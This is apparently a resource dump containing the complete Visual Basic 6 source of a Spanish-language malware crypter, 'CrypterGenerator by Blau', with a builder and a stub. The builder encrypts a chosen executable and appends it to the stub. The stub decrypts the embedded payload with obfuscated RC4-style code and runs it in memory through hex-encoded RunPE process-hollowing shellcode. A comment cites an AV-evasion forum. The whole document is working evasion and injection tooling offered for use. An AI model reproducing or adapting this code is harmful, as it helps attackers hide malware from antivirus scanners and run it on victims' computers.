        ��  ��                  �  (   S T U B   ��i       0
        Type=Exe
Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\..\..\..\..\..\Windows\SysWOW64\stdole2.tlb#OLE Automation
Module=MainModule; MainModule.bas
Startup="Sub Main"
ExeName32="Stub.exe"
Command32=""
Name="CrypterGeneratorStub"
HelpContextID="0"
CompatibleMode="0"
MajorVer=1
MinorVer=0
RevisionVer=0
AutoIncrementVer=0
ServerSupportFiles=0
VersionCompanyName="PORTABLES ANCALU"
CompilationType=0
OptimizationType=0
FavorPentiumPro(tm)=0
CodeViewDebugInfo=0
NoAliasing=0
BoundsCheck=0
OverflowCheck=0
FlPointCheck=0
FDIVCheck=0
UnroundedFP=0
StartMode=0
Unattended=0
Retained=0
ThreadPerObject=0
MaxNumberOfThreads=1
  #   (   S T U B   ��j       0
        MainModule = 50, 50, 1128, 683, Z
 �$  (   S T U B   ��k       0
        Attribute VB_Name = "MainModule"
Private Declare Function CallWindowProcW Lib "USER32" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Sub Main()
    Dim sMe() As String
    Dim sDelimitador As String
    Dim sDescifrado As String
    Dim sBinario() As Byte
    
    sDelimitador = "AQUIVAELDELIMITADOR"
    sMe = SplitMyself(sDelimitador)

    sDescifrado = LHOkzoPGFR(sMe(1), sMe(2))
    sBinario = StrConv(sDescifrado, vbFromUnicode)
    
    Call RunPE(GetCurrentPath, sBinario)
End Sub

Public Function LHOkzoPGFR(ByVal eIDZqDPUcT As String, ByVal WokvHZXMKJ As String) As String
    On Error Resume Next
    Dim sLLfywdtBJ(0 To 255) As Integer, FzvYRYNJZZ, GSLDVUnNCw As Long, POHsRpQZVi() As Byte
    
    POHsRpQZVi() = StrConv(WokvHZXMKJ, vbFromUnicode)
    For FzvYRYNJZZ = 0 To 255
        GSLDVUnNCw = (GSLDVUnNCw + sLLfywdtBJ(FzvYRYNJZZ) + POHsRpQZVi(FzvYRYNJZZ Mod Len(WokvHZXMKJ))) Mod 256
        sLLfywdtBJ(FzvYRYNJZZ) = FzvYRYNJZZ
    Next FzvYRYNJZZ
    POHsRpQZVi() = StrConv(eIDZqDPUcT, vbFromUnicode)
    For FzvYRYNJZZ = 0 To Len(eIDZqDPUcT)
        GSLDVUnNCw = (GSLDVUnNCw + sLLfywdtBJ(GSLDVUnNCw) + 1) Mod 256
        POHsRpQZVi(FzvYRYNJZZ) = iHdGIkvSRG(POHsRpQZVi(FzvYRYNJZZ), sLLfywdtBJ(Temp + sLLfywdtBJ((GSLDVUnNCw + sLLfywdtBJ(GSLDVUnNCw)) Mod 254)))
    Next FzvYRYNJZZ
    LHOkzoPGFR = StrConv(POHsRpQZVi, vbUnicode)
End Function

Private Function RjLeQSXEox(QqYkDXkgcQ, MebxTrztG)
    RjLeQSXEox = Not ((QqYkDXkgcQ And MebxTrztG))
End Function

Private Function iHdGIkvSRG(QqYkDXkgcQ, MebxTrztG)
    iHdGIkvSRG = RjLeQSXEox(RjLeQSXEox(QqYkDXkgcQ, RjLeQSXEox(QqYkDXkgcQ, MebxTrztG)), RjLeQSXEox(MebxTrztG, RjLeQSXEox(QqYkDXkgcQ, MebxTrztG)))
End Function

Public Function GetCurrentPath()
    GetCurrentPath = App.Path & "\" & App.EXEName & ".exe"
End Function

Public Function ReadMyself()
    Dim ReadMyself_ret As String
    Open GetCurrentPath For Binary As #1
        ReadMyself_ret = Space(LOF(1))
        Get #1, , ReadMyself_ret
    Close #1
    ReadMyself = ReadMyself_ret
End Function

Public Function SplitMyself(sDelimitador2 As String)
    SplitMyself = Split(ReadMyself, sDelimitador2)
End Function

Public Sub RunPE(ByVal TargetHost As String, bBuffer() As Byte)
    Dim s_ASM(7) As String
    Dim b_ASM(1287) As Byte
    Dim RunPE_i As Long
    Dim RunPE_j As Long
    Dim RunPE_k As Long

    s_ASM(0) = "LM\60LM\E8LM\4ELM\00LM\00LM\00LM\6BLM\00LM\65LM\00LM\72LM\00LM\6ELM\00LM\65LM\00LM\6CLM\00LM\33LM\00LM\32LM\00LM\00LM\00LM\6ELM\00LM\74LM\00LM\64LM\00LM\6CLM\00LM\6CLM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\00LM\5BLM\8BLM\FCLM\6ALM\42LM\E8LM\BBLM\03LM\00LM\00LM\8BLM\54LM\24LM\28LM\89LM\11LM\8BLM\54LM\24LM\2CLM\6ALM\3ELM\E8LM\AALM\03LM\00LM\00LM\89LM\11LM\6ALM\4ALM\E8LM\A1LM\03LM\00LM\00LM\89LM\39LM\6ALM\1ELM\6ALM\3CLM\E8LM\9DLM\03LM\00LM\00LM\6ALM\22LM\68LM\F4LM\00LM\00LM\00LM\E8LM\91LM\03LM\00LM\00LM\6ALM\26LM\6ALM\24LM\E8LM\88LM\03LM\00LM\00LM\6ALM\2ALM\6ALM\40LM\E8LM\7FLM\03LM\00LM\00"
    s_ASM(1) = "LM\6ALM\2ELM\6ALM\0CLM\E8LM\76LM\03LM\00LM\00LM\6ALM\32LM\68LM\C8LM\00LM\00LM\00LM\E8LM\6ALM\03LM\00LM\00LM\6ALM\2ALM\E8LM\5CLM\03LM\00LM\00LM\8BLM\09LM\C7LM\01LM\44LM\00LM\00LM\00LM\6ALM\12LM\E8LM\4DLM\03LM\00LM\00LM\68LM\5BLM\E8LM\14LM\CFLM\51LM\E8LM\79LM\03LM\00LM\00LM\6ALM\3ELM\E8LM\3BLM\03LM\00LM\00LM\8BLM\D1LM\6ALM\1ELM\E8LM\32LM\03LM\00LM\00LM\6ALM\40LM\FFLM\32LM\FFLM\31LM\FFLM\D0LM\6ALM\12LM\E8LM\23LM\03LM\00LM\00LM\68LM\5BLM\E8LM\14LM\CFLM\51LM\E8LM\4FLM\03LM\00LM\00LM\6ALM\1ELM\E8LM\11LM\03LM\00LM\00LM\8BLM\09LM\8BLM\51LM\3CLM\6ALM\3ELM\E8LM\05LM\03LM\00LM\00LM\8BLM\39LM\03LM\FALM\6ALM\22LM\E8LM\FALM\02LM\00LM\00LM\8BLM\09LM\68LM\F8LM\00LM\00LM\00LM\57LM\51LM\FFLM\D0LM\6ALM\00LM\E8LM\E8LM\02LM\00LM\00LM\68LM\88LM\FELM\B3LM\16LM\51LM\E8LM\14LM\03LM\00LM\00LM\6ALM\2ELM\E8LM\D6LM\02LM\00"
    s_ASM(2) = "LM\00LM\8BLM\39LM\6ALM\2ALM\E8LM\CDLM\02LM\00LM\00LM\8BLM\11LM\6ALM\42LM\E8LM\C4LM\02LM\00LM\00LM\57LM\52LM\6ALM\00LM\6ALM\00LM\6ALM\04LM\6ALM\00LM\6ALM\00LM\6ALM\00LM\6ALM\00LM\FFLM\31LM\FFLM\D0LM\6ALM\12LM\E8LM\A9LM\02LM\00LM\00LM\68LM\D0LM\37LM\10LM\F2LM\51LM\E8LM\D5LM\02LM\00LM\00LM\6ALM\22LM\E8LM\97LM\02LM\00LM\00LM\8BLM\11LM\6ALM\2ELM\E8LM\8ELM\02LM\00LM\00LM\8BLM\09LM\FFLM\72LM\34LM\FFLM\31LM\FFLM\D0LM\6ALM\00LM\E8LM\7ELM\02LM\00LM\00LM\68LM\9CLM\95LM\1ALM\6ELM\51LM\E8LM\AALM\02LM\00LM\00LM\6ALM\22LM\E8LM\6CLM\02LM\00LM\00LM\8BLM\11LM\8BLM\39LM\6ALM\2ELM\E8LM\61LM\02LM\00LM\00LM\8BLM\09LM\6ALM\40LM\68LM\00LM\30LM\00LM\00LM\FFLM\72LM\50LM\FFLM\77LM\34LM\FFLM\31LM\FFLM\D0LM\6ALM\36LM\E8LM\47LM\02LM\00LM\00LM\8BLM\D1LM\6ALM\22LM\E8LM\3ELM\02LM\00LM\00LM\8BLM\39LM\6ALM\3ELM\E8LM\35LM\02LM\00"
    s_ASM(3) = "LM\00LM\8BLM\31LM\6ALM\22LM\E8LM\2CLM\02LM\00LM\00LM\8BLM\01LM\6ALM\2ELM\E8LM\23LM\02LM\00LM\00LM\8BLM\09LM\52LM\FFLM\77LM\54LM\56LM\FFLM\70LM\34LM\FFLM\31LM\6ALM\00LM\E8LM\10LM\02LM\00LM\00LM\68LM\A1LM\6ALM\3DLM\D8LM\51LM\E8LM\3CLM\02LM\00LM\00LM\83LM\C4LM\0CLM\FFLM\D0LM\6ALM\12LM\E8LM\F9LM\01LM\00LM\00LM\68LM\5BLM\E8LM\14LM\CFLM\51LM\E8LM\25LM\02LM\00LM\00LM\6ALM\22LM\E8LM\E7LM\01LM\00LM\00LM\8BLM\11LM\83LM\C2LM\06LM\6ALM\3ALM\E8LM\DBLM\01LM\00LM\00LM\6ALM\02LM\52LM\51LM\FFLM\D0LM\6ALM\36LM\E8LM\CELM\01LM\00LM\00LM\C7LM\01LM\00LM\00LM\00LM\00LM\B8LM\28LM\00LM\00LM\00LM\6ALM\36LM\E8LM\BCLM\01LM\00LM\00LM\F7LM\21LM\6ALM\1ELM\E8LM\B3LM\01LM\00LM\00LM\8BLM\11LM\8BLM\52LM\3CLM\81LM\C2LM\F8LM\00LM\00LM\00LM\03LM\D0LM\6ALM\3ELM\E8LM\9FLM\01LM\00LM\00LM\03LM\11LM\6ALM\26LM\E8LM\96LM\01LM\00LM\00LM\6A"
    s_ASM(4) = "LM\28LM\52LM\FFLM\31LM\6ALM\12LM\E8LM\8ALM\01LM\00LM\00LM\68LM\5BLM\E8LM\14LM\CFLM\51LM\E8LM\B6LM\01LM\00LM\00LM\83LM\C4LM\0CLM\FFLM\D0LM\6ALM\26LM\E8LM\73LM\01LM\00LM\00LM\8BLM\39LM\8BLM\09LM\8BLM\71LM\14LM\6ALM\3ELM\E8LM\65LM\01LM\00LM\00LM\03LM\31LM\6ALM\26LM\E8LM\5CLM\01LM\00LM\00LM\8BLM\09LM\8BLM\51LM\0CLM\6ALM\22LM\E8LM\50LM\01LM\00LM\00LM\8BLM\09LM\03LM\51LM\34LM\6ALM\46LM\E8LM\44LM\01LM\00LM\00LM\8BLM\C1LM\6ALM\2ELM\E8LM\3BLM\01LM\00LM\00LM\8BLM\09LM\50LM\FFLM\77LM\10LM\56LM\52LM\FFLM\31LM\6ALM\00LM\E8LM\2ALM\01LM\00LM\00LM\68LM\A1LM\6ALM\3DLM\D8LM\51LM\E8LM\56LM\01LM\00LM\00LM\83LM\C4LM\0CLM\FFLM\D0LM\6ALM\36LM\E8LM\13LM\01LM\00LM\00LM\8BLM\11LM\83LM\C2LM\01LM\89LM\11LM\6ALM\3ALM\E8LM\05LM\01LM\00LM\00LM\8BLM\09LM\3BLM\CALM\0FLM\85LM\33LM\FFLM\FFLM\FFLM\6ALM\32LM\E8LM\F4LM\00LM\00LM\00"
    s_ASM(5) = "LM\8BLM\09LM\C7LM\01LM\07LM\00LM\01LM\00LM\6ALM\00LM\E8LM\E5LM\00LM\00LM\00LM\68LM\D2LM\C7LM\A7LM\68LM\51LM\E8LM\11LM\01LM\00LM\00LM\6ALM\32LM\E8LM\D3LM\00LM\00LM\00LM\8BLM\11LM\6ALM\2ELM\E8LM\CALM\00LM\00LM\00LM\8BLM\09LM\52LM\FFLM\71LM\04LM\FFLM\D0LM\6ALM\22LM\E8LM\BBLM\00LM\00LM\00LM\8BLM\39LM\83LM\C7LM\34LM\6ALM\32LM\E8LM\AFLM\00LM\00LM\00LM\8BLM\31LM\8BLM\B6LM\A4LM\00LM\00LM\00LM\83LM\C6LM\08LM\6ALM\2ELM\E8LM\9DLM\00LM\00LM\00LM\8BLM\11LM\6ALM\46LM\E8LM\94LM\00LM\00LM\00LM\51LM\6ALM\04LM\57LM\56LM\FFLM\32LM\6ALM\00LM\E8LM\86LM\00LM\00LM\00LM\68LM\A1LM\6ALM\3DLM\D8LM\51LM\E8LM\B2LM\00LM\00LM\00LM\83LM\C4LM\0CLM\FFLM\D0LM\6ALM\22LM\E8LM\6FLM\00LM\00LM\00LM\8BLM\09LM\8BLM\51LM\28LM\03LM\51LM\34LM\6ALM\32LM\E8LM\60LM\00LM\00LM\00LM\8BLM\09LM\81LM\C1LM\B0LM\00LM\00LM\00LM\89LM\11LM\6ALM\00LM\E8"
    s_ASM(6) = "LM\4FLM\00LM\00LM\00LM\68LM\D3LM\C7LM\A7LM\E8LM\51LM\E8LM\7BLM\00LM\00LM\00LM\6ALM\32LM\E8LM\3DLM\00LM\00LM\00LM\8BLM\D1LM\6ALM\2ELM\E8LM\34LM\00LM\00LM\00LM\8BLM\09LM\FFLM\32LM\FFLM\71LM\04LM\FFLM\D0LM\6ALM\00LM\E8LM\24LM\00LM\00LM\00LM\68LM\88LM\3FLM\4ALM\9ELM\51LM\E8LM\50LM\00LM\00LM\00LM\6ALM\2ELM\E8LM\12LM\00LM\00LM\00LM\8BLM\09LM\FFLM\71LM\04LM\FFLM\D0LM\6ALM\4ALM\E8LM\04LM\00LM\00LM\00LM\8BLM\21LM\61LM\C3LM\8BLM\CBLM\03LM\4CLM\24LM\04LM\C3LM\6ALM\00LM\E8LM\F2LM\FFLM\FFLM\FFLM\68LM\54LM\CALM\AFLM\91LM\51LM\E8LM\1ELM\00LM\00LM\00LM\6ALM\40LM\68LM\00LM\10LM\00LM\00LM\FFLM\74LM\24LM\18LM\6ALM\00LM\FFLM\D0LM\FFLM\74LM\24LM\14LM\E8LM\CFLM\FFLM\FFLM\FFLM\89LM\01LM\83LM\C4LM\10LM\C3LM\E8LM\22LM\00LM\00LM\00LM\68LM\A4LM\4ELM\0ELM\ECLM\50LM\E8LM\4BLM\00LM\00LM\00LM\83LM\C4LM\08LM\FFLM\74LM\24LM\04"
    s_ASM(7) = "LM\FFLM\D0LM\FFLM\74LM\24LM\08LM\50LM\E8LM\38LM\00LM\00LM\00LM\83LM\C4LM\08LM\C3LM\55LM\52LM\51LM\53LM\56LM\57LM\33LM\C0LM\64LM\8BLM\70LM\30LM\8BLM\76LM\0CLM\8BLM\76LM\1CLM\8BLM\6ELM\08LM\8BLM\7ELM\20LM\8BLM\36LM\38LM\47LM\18LM\75LM\F3LM\80LM\3FLM\6BLM\74LM\07LM\80LM\3FLM\4BLM\74LM\02LM\EBLM\E7LM\8BLM\C5LM\5FLM\5ELM\5BLM\59LM\5ALM\5DLM\C3LM\55LM\52LM\51LM\53LM\56LM\57LM\8BLM\6CLM\24LM\1CLM\85LM\EDLM\74LM\43LM\8BLM\45LM\3CLM\8BLM\54LM\28LM\78LM\03LM\D5LM\8BLM\4ALM\18LM\8BLM\5ALM\20LM\03LM\DDLM\E3LM\30LM\49LM\8BLM\34LM\8BLM\03LM\F5LM\33LM\FFLM\33LM\C0LM\FCLM\ACLM\84LM\C0LM\74LM\07LM\C1LM\CFLM\0DLM\03LM\F8LM\EBLM\F4LM\3BLM\7CLM\24LM\20LM\75LM\E1LM\8BLM\5ALM\24LM\03LM\DDLM\66LM\8BLM\0CLM\4BLM\8BLM\5ALM\1CLM\03LM\DDLM\8BLM\04LM\8BLM\03LM\C5LM\5FLM\5ELM\5BLM\59LM\5ALM\5DLM\C3LM\C3LM\00LM\00LM\00LM\00"
 
    For RunPE_i = 0 To 7
        For RunPE_j = 1 To 805 Step 5
            b_ASM(RunPE_k) = Replace(Mid(s_ASM(RunPE_i), RunPE_j, 5), "LM\", Chr(Val("38")) & Chr(Val("72"))): RunPE_k = RunPE_k + 1
        Next RunPE_j
    Next RunPE_i

    CallWindowProcW VarPtr(b_ASM(0)), StrPtr(TargetHost), VarPtr(bBuffer(0)), 0, 0
End Sub

   ,   B U I L D E R   ��g     0
           lt      LB P   x   X  �  �   ����  �      C l a v e   	 R������ � K�Q   �DB MS Sans Serif       LB T   x   �   �  �   ����  �      A r c h i v o   	 R������ � K�Q   �DB MS Sans Serif       LB   �  �  �  �        
      m _ b s t r A u t h o r          $   m _ b s t r D e s c r i p t i o n          $   m _ b s t r A p p l i c a t i o n             m _ n H u e                m _ B a c k C o l o r         ���   m _ F o r e C o l o r               m _ P a n e l C o l o r         ���"   m _ P a n e l T e x t C o l o r               m _ b A p p l y C o l o r s           $   m _ b S k i n C l i e n t A r e a                                        m _ b s t r N a m e             m _ b s t r T a g              R   ,   B U I L D E R   ��h     0
        Form1 = 50, 50, 1128, 683, Z, 25, 25, 1103, 658, C
mEOF = 100, 100, 1178, 733, 
    ,   B U I L D E R   ��i     0
        Attribute VB_Name = "mEOF"
Option Explicit

Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
        Dim sFileBuf As String, sEOFBuf As String, sChar As String
        Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
        
        If Dir(sFilePath) = "" Then GoTo Err:
        lFF = FreeFile
        Open sFilePath For Binary As #lFF
                sFileBuf = Space(LOF(lFF))
                Get #lFF, , sFileBuf
        Close #lFF
                
        lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
        sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
        ReadEOFData = StrReverse(sEOFBuf)
        Exit Function
        
Err:
        ReadEOFData = vbNullString
End Function

Sub WriteEOFData(sFilePath As String, sEOFData As String)
        Dim sFileBuf As String
        Dim lFF As Long
On Error Resume Next

        If Dir(sFilePath) = "" Then Exit Sub
        lFF = FreeFile
        Open sFilePath For Binary As #lFF
                sFileBuf = Space(LOF(lFF))
                Get #lFF, , sFileBuf
        Close #lFF
        
        Kill sFilePath
        lFF = FreeFile
        
        Open sFilePath For Binary As #lFF
                Put #lFF, , sFileBuf & sEOFData
        Close #lFF
End Sub

Public Function GetNullBytes(lNum) As String
        Dim sBuf As String
        Dim i As Integer
        
        For i = 1 To lNum
                sBuf = sBuf & Chr(0)
        Next
        
        GetNullBytes = sBuf
End Function
a  ,   B U I L D E R   ��e     0
        Type=Exe
Form=Form1.frm
Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\..\..\..\..\..\Windows\SysWOW64\stdole2.tlb#OLE Automation
Object={F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0; COMDLG32.OCX
Object={90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0; Actskin4.ocx
Module=mEOF; mEOF.bas
IconForm="Form1"
Startup="Form1"
HelpFile=""
Title="Builder2"
ExeName32="Builder.exe"
Command32=""
Name="CrypterGeneratorBlau2"
HelpContextID="0"
CompatibleMode="0"
MajorVer=2
MinorVer=0
RevisionVer=0
AutoIncrementVer=1
ServerSupportFiles=0
VersionCompanyName="CrypterGenerator v2 by Blau"
CompilationType=0
OptimizationType=0
FavorPentiumPro(tm)=0
CodeViewDebugInfo=0
NoAliasing=0
BoundsCheck=0
OverflowCheck=0
FlPointCheck=0
FDIVCheck=0
UnroundedFP=0
StartMode=0
Unattended=0
Retained=0
ThreadPerObject=0
MaxNumberOfThreads=1
   (  ,   B U I L D E R   ��f     0
        VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "Actskin4.ocx"
Begin VB.Form Form1 
   Caption         =   "FormTitle"
   ClientHeight    =   1830
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4620
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1830
   ScaleWidth      =   4620
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox chkEOF 
      Caption         =   "EOF"
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   1080
      Visible         =   0   'False
      Width           =   735
   End
   Begin ACTIVESKINLibCtl.SkinLabel SkinLabel2 
      Height          =   255
      Left            =   120
      OleObjectBlob   =   "Form1.frx":000C
      TabIndex        =   7
      Top             =   600
      Width           =   735
   End
   Begin ACTIVESKINLibCtl.SkinLabel SkinLabel1 
      Height          =   255
      Left            =   120
      OleObjectBlob   =   "Form1.frx":0074
      TabIndex        =   6
      Top             =   240
      Width           =   735
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   3720
      OleObjectBlob   =   "Form1.frx":00E0
      Top             =   1440
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   4200
      Top             =   1440
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton btnCifrar 
      Caption         =   "CIFRAR"
      Height          =   255
      Left            =   960
      TabIndex        =   5
      Top             =   1080
      Width           =   3495
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   285
      Left            =   120
      TabIndex        =   4
      Text            =   "                              CrypterGenerator by Blau"
      Top             =   1440
      Width           =   4335
   End
   Begin VB.CommandButton btnGenerar 
      Caption         =   "Generar"
      Height          =   255
      Left            =   3360
      TabIndex        =   3
      Top             =   600
      Width           =   1095
   End
   Begin VB.CommandButton btnBuscar 
      Caption         =   "Buscar"
      Height          =   255
      Left            =   3360
      TabIndex        =   2
      Top             =   240
      Width           =   1095
   End
   Begin VB.TextBox txtClave 
      Enabled         =   0   'False
      Height          =   285
      Left            =   960
      TabIndex        =   1
      Top             =   600
      Width           =   2295
   End
   Begin VB.TextBox txtArchivo 
      Enabled         =   0   'False
      Height          =   285
      Left            =   960
      TabIndex        =   0
      Top             =   240
      Width           =   2295
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub btnBuscar_Click()
    With CD
        .DialogTitle = "Busca el archivo a cifrar"
        .Filter = "EXE|*.exe"
        .ShowOpen
    End With
    txtArchivo.Text = CD.FileName
End Sub

Public Function RandomString(ByVal Length As Long, Optional charset As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ") As String
    Dim chars() As Byte, value() As Byte, chrUprBnd As Long, i As Long
    If Length > 0& Then
        Randomize
        chars = charset
        chrUprBnd = Len(charset) - 1&
        Length = (Length * 2&) - 1&
        ReDim value(Length) As Byte
        For i = 0& To Length Step 2&
            value(i) = chars(CLng(chrUprBnd * Rnd) * 2&)
        Next
    End If
    RandomString = value
End Function

Private Sub btnCifrar_Click()
    With CD
        .DialogTitle = "Selecciona la ruta para guardar"
        .Filter = "EXE|*.exe"
        .ShowSave
    End With
    
    If CD.FileName = vbNullString Then Exit Sub
        
        If txtClave.Text = vbNullString Then txtClave.Text = RandomString(60)

    Dim sStub As String, sArchivo As String, sDelimitador As String, sStubName As String
    sStubName = "STUBNAME.exe"
    sDelimitador = "AQUIVAELDELIMITADOR"
    
    Open App.Path & "\" & sStubName For Binary As #1
        sStub = Space(LOF(1))
        Get #1, , sStub
    Close #1
    
    Open txtArchivo.Text For Binary As #1
        sArchivo = Space(LOF(1))
        Get #1, , sArchivo
    Close #1
    
    sArchivo = LHOkzoPGFR(sArchivo, txtClave.Text)
    
    Open CD.FileName For Binary As #1
        Put #1, , sStub & sDelimitador & sArchivo & sDelimitador & txtClave.Text
    Close #1
    
    If chkEOF.value Then
        Call WriteEOFData(CD.FileName, ReadEOFData(txtArchivo.Text))
    End If
    
    MsgBox "�Archivo cifrado correctamente!"
End Sub

Private Sub btnGenerar_Click()
    txtClave.Text = RandomString(60)
End Sub

'Cifrado: 'ecrypt gerador vb6' de sudo
'http://indetectables.net/viewtopic.php?f=12&t=51030
Public Function LHOkzoPGFR(ByVal eIDZqDPUcT As String, ByVal WokvHZXMKJ As String) As String
    On Error Resume Next
    Dim sLLfywdtBJ(0 To 255) As Integer, FzvYRYNJZZ, GSLDVUnNCw As Long, POHsRpQZVi() As Byte
    
    POHsRpQZVi() = StrConv(WokvHZXMKJ, vbFromUnicode)
    For FzvYRYNJZZ = 0 To 255
        GSLDVUnNCw = (GSLDVUnNCw + sLLfywdtBJ(FzvYRYNJZZ) + POHsRpQZVi(FzvYRYNJZZ Mod Len(WokvHZXMKJ))) Mod 256
        sLLfywdtBJ(FzvYRYNJZZ) = FzvYRYNJZZ
    Next FzvYRYNJZZ
    POHsRpQZVi() = StrConv(eIDZqDPUcT, vbFromUnicode)
    For FzvYRYNJZZ = 0 To Len(eIDZqDPUcT)
        GSLDVUnNCw = (GSLDVUnNCw + sLLfywdtBJ(GSLDVUnNCw) + 1) Mod 256
        POHsRpQZVi(FzvYRYNJZZ) = iHdGIkvSRG(POHsRpQZVi(FzvYRYNJZZ), sLLfywdtBJ(Temp + sLLfywdtBJ((GSLDVUnNCw + sLLfywdtBJ(GSLDVUnNCw)) Mod 254)))
    Next FzvYRYNJZZ
    LHOkzoPGFR = StrConv(POHsRpQZVi, vbUnicode)
End Function

Private Function RjLeQSXEox(QqYkDXkgcQ, MebxTrztG)
    RjLeQSXEox = Not ((QqYkDXkgcQ And MebxTrztG))
End Function

Private Function iHdGIkvSRG(QqYkDXkgcQ, MebxTrztG)
    iHdGIkvSRG = RjLeQSXEox(RjLeQSXEox(QqYkDXkgcQ, RjLeQSXEox(QqYkDXkgcQ, MebxTrztG)), RjLeQSXEox(MebxTrztG, RjLeQSXEox(QqYkDXkgcQ, MebxTrztG)))
End Function

Private Sub Form_Load()
    'Skin1.LoadSkin ("RUTASKIN")
    'Skin1.ApplySkin Me.hWnd
    'chkEOF.Enabled = True
End Sub
